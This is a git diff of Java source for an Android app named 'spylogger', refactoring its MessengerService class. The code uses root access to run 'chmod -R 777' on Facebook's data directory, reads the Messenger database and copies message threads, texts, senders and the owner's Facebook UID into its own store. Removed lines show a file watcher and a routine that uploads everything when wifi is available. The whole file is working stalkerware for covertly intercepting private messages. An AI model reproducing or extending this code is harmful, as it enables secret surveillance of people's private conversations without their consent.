@@ -1,18 +1,12 @@
 package com.gravatasufoca.spylogger.services;
 
-import android.app.Service;
 import android.content.Context;
-import android.content.Intent;
 import android.content.pm.PackageManager.NameNotFoundException;
-import android.os.Binder;
-import android.os.FileObserver;
-import android.os.IBinder;
 import android.util.Log;
 
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
-import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.model.TipoMensagem;
 import com.gravatasufoca.spylogger.model.TipoMidia;
@@ -22,7 +16,6 @@ import com.gravatasufoca.spylogger.model.messenger.Messages;
 import com.gravatasufoca.spylogger.model.messenger.Prefs;
 import com.gravatasufoca.spylogger.model.messenger.Sender;
 import com.gravatasufoca.spylogger.model.messenger.Thread;
-import com.gravatasufoca.spylogger.receivers.PrimeiraCarga;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
@@ -41,40 +34,28 @@ import java.util.Date;
 import java.util.Iterator;
 import java.util.List;
 
-public class MessengerService extends Service {
-
-    private String pathToWatch;
+public class MessengerService  implements Mensageiro{
     private String inFileName;
-    private Dao<Messages, Integer> daoMsgExternal;
 
-    private DatabaseHelper dbHelper;
-
-    private DatabaseHelperFacebookThreads external;
-    private final IBinder mBinder = new LocalBinder();
     private Contact proprietario;
-    private boolean primeiraVez;
+    private Context context;
 
-    public class LocalBinder extends Binder {
-        MessengerService getService() {
-            return MessengerService.this;
+
+    public MessengerService(Context context) {
+        if (context != null) {
+            this.context = context;
+            onCreate();
         }
     }
 
-    public MessengerService() {
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return mBinder;
-    }
 
     private void chmod() {
 
         try {
             CommandCapture command = new CommandCapture(0, "chmod -R 777 "
                     + Utils.FACEBOOK_DIR_PATH, "chmod -R 777 "
-                    + getApplicationContext().getPackageManager()
-                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);
+                    + context.getPackageManager()
+                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir);
 
             if (RootTools.isAccessGiven())
                 RootTools.getShell(true).add(command);
@@ -85,12 +66,10 @@ public class MessengerService extends Service {
 
     }
 
-    @Override
     public void onCreate() {
-        pathToWatch = DatabaseHelperFacebookThreads.DATABASE_NAME;
         try {
-            inFileName = getApplicationContext().getPackageManager()
-                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
+            inFileName = context.getPackageManager()
+                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir
                     + "/databases/" + DatabaseHelper.DATABASE_NAME;
         } catch (NameNotFoundException e) {
             e.printStackTrace();
@@ -100,54 +79,17 @@ public class MessengerService extends Service {
     }
 
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if(intent!=null){
-            primeiraVez=intent.getBooleanExtra("primeiraVez",false);
-        }
+    public void start() {
+
         if ((new File(DatabaseHelperFacebookThreads.DATABASE_NAME)).exists()) {
-            Log.d("FACESLOG - FLAGS", Integer.toString(flags));
-            Utils.context = getApplicationContext();
             updateTopicos();
-
-            if (Utils.faceObserver == null)
-                setObserver();
-
-            Log.d("FACESLOG - OBSESRVER", Utils.faceObserver.toString());
-        }else{
-            continuarServicos();
         }
-        return START_NOT_STICKY;
-    }
-
-    private void setObserver() {
-        Utils.faceObserver = new FileObserver(pathToWatch) { // set up a file observer to
-            // watch this directory on
-            // sd card
-
-            @Override
-            public void onEvent(int event, String file) {
-
-                switch (event) {
-                    case FileObserver.MODIFY:
-                        Log.d("FACES LOGGER", "MODIFY:" + pathToWatch + file);
-                        proprietario = getProprietario(getApplicationContext());
-
-                        updateTopicos();
-                        break;
-                    default:
-                        // just ignore
-                        break;
-                }
-
-            }
-        };
-        Utils.faceObserver.startWatching(); // START OBSERVING
     }
 
     private synchronized void updateTopicos() {
-        external = new DatabaseHelperFacebookThreads(getApplicationContext());
-        dbHelper = new DatabaseHelper((getApplicationContext()));
+        DatabaseHelperFacebookThreads external = new DatabaseHelperFacebookThreads(context);
+        DatabaseHelper dbHelper = new DatabaseHelper(context);
+        Dao<Messages, Integer> daoMsgExternal;
         GenericRawResults<Object[]> raws = null;
         try {
             dbHelper.getWritableDatabase();
@@ -155,10 +97,8 @@ public class MessengerService extends Service {
 
             daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");
 
-
             raws = daoMsgExternal.queryRaw("select thread_key,snippet,senders,snippet_sender, timestamp_ms from threads where thread_key not in( select idReferencia from localdb.topico where tipoMensagem=1 )",
                     new DataType[]{DataType.STRING, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG});
-            List<String> sThread = new ArrayList<>();
 
             List<Topico> tt = new ArrayList<>();
             Iterator<Object[]> iterator = raws.iterator();
@@ -176,7 +116,7 @@ public class MessengerService extends Service {
 
                 Topico topico = new Topico.TopicoBuilder()
                         .setIdReferencia(thread.getThread_key())
-                        .setNome(thread.getNomes(proprietario))
+                        .setNome(thread.getNomes(context,proprietario))
                         .setGrupo(thread.getSenders() != null && thread.getSenders().size() > 2)
                         .build(TipoMensagem.MESSENGER);
                 tt.add(topico);
@@ -201,6 +141,12 @@ public class MessengerService extends Service {
                 if (raws != null) {
                     raws.close();
                 }
+                if(dbHelper!=null){
+                    dbHelper.close();
+                }
+                if(external!=null){
+                    external.close();
+                }
             } catch (IOException e) {
             }
         }
@@ -209,8 +155,16 @@ public class MessengerService extends Service {
 
 
     private synchronized void updateMsg(List<Topico> tt) {
+
+        DatabaseHelperFacebookThreads external = new DatabaseHelperFacebookThreads(context);
+        DatabaseHelper dbHelper = new DatabaseHelper(context);
+        Dao<Messages, Integer> daoMsgExternal;
+
         GenericRawResults<Object[]> rawResults = null;
         try {
+            daoMsgExternal = external.getMessagesDao();
+
+            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");
 
             rawResults = daoMsgExternal.queryRaw("select msg_id,thread_key,text,sender,timestamp_ms from messages where msg_id not in( select idReferencia from localdb.mensagem )",
                     new DataType[]{DataType.STRING, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG});
@@ -231,7 +185,7 @@ public class MessengerService extends Service {
 
                 Sender sender = message.getSender();
                 if (sender == null) continue;
-                Contact contato = sender.getContato();
+                Contact contato = sender.getContato(context);
                 boolean remetente = contato.equals(proprietario);
 
                 Topico tmpTopico = null;
@@ -270,7 +224,6 @@ public class MessengerService extends Service {
                     dbHelper.getDao(Mensagem.class).create(mensagens);
                 }
             }
-            continuarServicos();
 
             Log.i(this.getClass().getSimpleName(), "TERMINOU");
         } catch (Exception e) {
@@ -278,28 +231,23 @@ public class MessengerService extends Service {
                 if (rawResults != null) {
                     rawResults.close();
                 }
+                if(dbHelper!=null){
+                    dbHelper.close();
+                }
+                if(external!=null){
+                    external.close();
+                }
             } catch (IOException ee) {
             }
         }
     }
-    private void continuarServicos(){
-        if(primeiraVez){
-            primeiraVez=false;
-            Intent intent = new Intent(Utils.PRIMEIRA_CARGA);
-            intent.putExtra(PrimeiraCarga.INICIALIZAR,true);
-            sendBroadcast(intent);
-        }else{
-            if(NetworkUtil.isWifi(getApplicationContext())) {
-                Utils.enviarTudo(getApplicationContext());
-            }
-        }
-    }
+
     private Contact getProprietario(Context context) {
         try {
 
             String uid = context.getSharedPreferences(Utils.PREF, 0).getString("UID", "");
             if (!uid.isEmpty())
-                return Utils.getContato(uid);
+                return Utils.getContato(context,uid);
 
             Dao<Prefs, Integer> dao = (new DatabaseHelperFacebookPrefs(context)).getPrefsDao();
             List<Prefs> prefs = dao.queryForAll();
@@ -308,13 +256,13 @@ public class MessengerService extends Service {
                 if (pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_uid")) {
                     context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", pref.getValue()).commit();
 
-                    return Utils.getContato(pref.getValue());
+                    return Utils.getContato(context,pref.getValue());
                 } else if (pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_me_user")) {
                     try {
                         JSONObject json = new JSONObject(pref.getValue());
                         context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", json.getString("uid")).commit();
 
-                        return Utils.getContato(json.getString("uid"));
+                        return Utils.getContato(context,json.getString("uid"));
                     } catch (JSONException e) {
                         e.printStackTrace();
                     }
